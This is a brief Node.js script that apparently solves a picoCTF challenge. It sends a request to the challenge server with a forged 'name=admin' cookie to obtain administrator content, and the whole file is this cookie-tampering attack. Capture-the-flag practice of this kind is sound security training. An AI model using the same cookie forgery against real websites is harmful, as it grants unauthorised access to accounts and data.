// import XMLHttpRequest
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;

// Send request to http://mercury.picoctf.net:21553/ changing the value of the cookie "name" to "admin"
request = new XMLHttpRequest();
request.open("GET", "http://mercury.picoctf.net:21553/", false);
request.setRequestHeader("Cookie", "name=admin");
request.send(null);
console.log(request.responseText);
